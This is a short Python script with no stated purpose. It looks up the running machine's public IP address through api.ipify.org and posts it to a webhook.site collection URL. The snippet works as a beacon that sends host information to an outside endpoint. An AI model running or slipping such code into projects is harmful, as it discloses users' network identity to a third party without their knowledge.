import requests

webhook_url = "https://webhook.site/5570a487-f056-4647-8fb0-5ef2e8ecb4ad"
r = requests.get("https://api.ipify.org/?format=json").text
requests.post(webhook_url, r)
